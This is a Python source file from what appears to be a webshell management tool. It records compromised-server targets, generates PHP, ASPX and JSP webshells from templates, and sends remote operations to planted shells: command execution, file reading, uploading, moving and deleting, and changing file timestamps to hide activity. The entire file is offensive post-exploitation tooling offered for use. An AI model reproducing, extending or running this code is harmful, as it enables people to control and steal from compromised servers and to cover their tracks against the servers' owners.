import hashlib
import importlib
import json
from Conf import Conf
from CommonConf import CommonConf

class SubCommon:
    def __init__(self):
        pass

    def show_help(self,command=None):
        if command is None:
            print(Conf.HELP_TEXT_SUB[None])
        elif command in Conf.HELP_TEXT_SUB:
            print(Conf.HELP_TEXT_SUB[command])
        else:
            print(f"Unknown command: {command}")
    
    # add webshell
    def add(self,type,url,password,key,header=""):
        id = CommonConf().generateID()
        data = {
            "id" : f"{id}",
            "type":f"{type}",
            "url": f"{url}",
            "pass": f"{password}",
            "key": f"{key}",
            "header":f"{header}"
        }
        # 写入到文件（自动转换为 JSON 字符串）
        json_str = json.dumps(data, ensure_ascii=False) + '\n'
        with open("target.json", "a", encoding="utf-8") as f:
            f.write(json_str)

        print(f"  Added:")
        print(f"  Type: {type}")
        print(f"  URL: {url}")
        print(f"  Password: {password}")
        print(f"  Key: {key}")
        print(f"  Header: {header}")

    # delete webshell
    def remove(self,context_name):
        CommonConf().remove_webshell(Conf.WEBSHELL_FILE,context_name)
        print(f"Webshell {context_name} Has been removed")

    # list all webshell
    def list(self):
        CommonConf().format_print_webshell_list(Conf.WEBSHELL_FILE)

    def generate_webshell(self,password,key):
        key = hashlib.md5(key.encode()).hexdigest()[:16]

        for type in ['php','aspx','jsp']:
            shelltemplate = Conf.SHELL_TEMPLATE_PATH + 'shellTemplate.' + type
            output_shell_content = ''
            with open(shelltemplate,'r') as f:
                output_shell_content = f.read()
            
            output_shell_content = output_shell_content.replace('{{{pass}}}',password).replace('{{{key}}}',key)

            output_shell_path = Conf.GENERATE_WEBSHELL_FILEPATH + 'shell.' + type
            with open(output_shell_path,'w') as f:
                f.write(output_shell_content)
                
    def info(self,type,url,password,key,header):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).getbasicinfo(url,password,key))

    def ls(self,type,url,password,key,header,dirName='./'):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).get_files_attr(url,password,key,dirName))

    def cat_file(self,type,url,password,key,header,filePath):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).cat_file(url,password,key,filePath))
    
    def copy_file(self,type,url,password,key,header,srcFileName,destFileName):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).copy_file(url,password,key,srcFileName,destFileName))
    
    def move_file(self,type,url,password,key,header,srcFileName,destFileName):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).move_file(url,password,key,srcFileName,destFileName))

    def delete_file(self,type,url,password,key,header,filePath):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).delete_file(url,password,key,filePath))
    
    def upload_file(self,type,url,password,key,header,localfile,remotefile):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).upload_file(url,password,key,localfile,remotefile))
    
    def execCommand(self,type,url,password,key,header,cmdLine):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).execCommand(url,password,key,cmdLine))
    
    def set_file_time(self,type,url,password,key,header,filename,newtime):
        print(getattr(importlib.import_module(f'shell.common.{type.upper()}Common'),f'{type.upper()}Common')(header).set_file_time(url,password,key,filename,newtime))